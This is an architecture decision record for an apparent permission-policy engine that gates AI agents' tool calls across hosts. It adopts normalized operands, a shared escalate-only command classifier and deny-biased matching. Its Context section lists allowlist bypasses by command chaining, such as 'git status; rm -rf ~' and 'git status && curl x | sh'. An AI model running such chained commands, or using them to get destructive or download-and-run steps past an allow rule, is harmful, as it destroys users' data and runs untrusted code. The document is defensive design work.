# ADR-011: Normalized operands and classification ownership

- **Status:** Accepted
- **Date:** 2026-09-20
- **Tickets:** RFX-095, RFX-096, RFX-097, RFX-098
- **Supersedes:** none

## Context

ADR-001 exists so that one policy means the same thing under every host. As
the contracts stand, the first real policy breaks that promise.

**Arguments are host-shaped.** A rule about shell commands has to address
`arguments.<something>`, and `arguments` is passed "as received" (ADR-001 §4).
One host delivers a command as a string under one key, another as an argument
vector under a different key, an MCP tool under whatever its author chose. A
rule written against one host's shape silently fails to match on another host.
ADR-001 names that outcome precisely: a false allow.

**String matching cannot express "this command".** The operators in RFX-013
(`starts_with`, `matches`) work on text. `git status; rm -rf ~`,
`git status && curl x | sh`, `$(...)`, backticks, `bash -c "..."`, `xargs`,
`find -exec`, `env X=1 rm`, a `package.json` script: each starts with, or
matches, something harmless. RFX-018 plans to test these bypasses, but no
ticket gives the matcher the means to defeat them.

**Nobody owns classification.** ADR-001 §4 makes the adapter set
`sideEffectClass`. For a shell command that requires understanding the command,
which is domain logic and not "host-specific translation only". `CLAUDE.md`
lists a "command classifier" among the security-sensitive packages, yet there is
no such package in the architecture and no ticket for it. RFX-017's guarantee
("never auto-allows destructive, external or privilege actions") rests entirely
on that missing piece.

## Options

Operands, meaning what a rule matches against:

- **O1. Rules address `arguments.*` directly.** The status quo.
- **O2. Canonical operands on the action**, populated by adapters: the command
  (argument vector and raw text), the paths touched, the network targets.
- **O3. Operands derived in core** from `tool` and `arguments`, using per-host
  argument maps that adapters supply as data.

Classification ownership:

- **C1. Adapter only**, as ADR-001 §4 says today.
- **C2. A shared classifier package**, called by adapters.
- **C3. Shared classifier, plus core may re-classify** under an escalate-only
  rule.

## Decision

Accepted by the maintainer on 2026-09-20, as recommended when it was proposed:
**O2 and C3**, with one matching principle.

- O1 makes policies host-specific, which defeats ADR-001.
- O2 keeps translation in adapters, where host knowledge lives, and gives
  policy authors three stable things to write rules about. It is an additive
  contract change (ADR-009, receiver first) and a promotion under ADR-001 §3.7.
- C3: one classifier, shared, so that every host classifies the same command
  the same way. Core may raise a side-effect class and may never lower one, so
  a buggy or compromised adapter cannot talk an action down.

**Asymmetric matching.** An allow rule matches only a command that is fully
understood: every segment parsed, no substitution, no indirection. A deny rule
matches if any segment matches. What the parser does not understand is
unresolved, and unresolved never becomes allow.

This needs a new package for the classifier. The monorepo layout is declared
exact in `docs/architecture.md`, so accepting this ADR means updating the
layout and the dependency rules in `CLAUDE.md` in the same change.

## Consequences

### Positive

- "One policy language for every host" becomes true for the three families
  that matter most: shell, files, network.
- The bypass corpus in RFX-018 has something to pass against.
- The starter policy pack can be written once.

### Negative

- A real shell grammar is a dependency or a substantial parser, on the hot
  path. It needs its own latency budget and its own adversarial corpus.
- Operands cost adapter work per host, and an operand an adapter cannot fill
  must be absent, which by ADR-001 §4 means unknown and never safe.
- The contract grows. Operand fields have to be bounded like everything else
  in `CONTRACT_LIMITS`.
- A new package and a change to a layout that is declared exact.

## Open questions

- Which operands are in the first cut? Command, paths and network targets are
  the proposal. Is "network targets" tractable for a shell command at all, or
  only for HTTP-shaped tools?
- Does path normalization resolve symlinks (needs filesystem access in the
  adapter) or only lexical traversal?
- Is policy matched before or after redaction? A deny rule about a
  secret-shaped argument cannot match text that has already been redacted
  (decide together with ADR-006).
- Regular expressions on the hot path: a linear-time engine, or a complexity
  check at policy compile time (RFX-098)?

## References

- ADR-001: §1, §3.7, §4 and its open follow-up on side-effect severity
- ADR-009: §3 (additive, receiver first)
- `CLAUDE.md`: principle 7 (security-sensitive code), "Repository boundaries"
- `docs/backlog.md`: RFX-013, RFX-017, RFX-018, RFX-095 to RFX-098
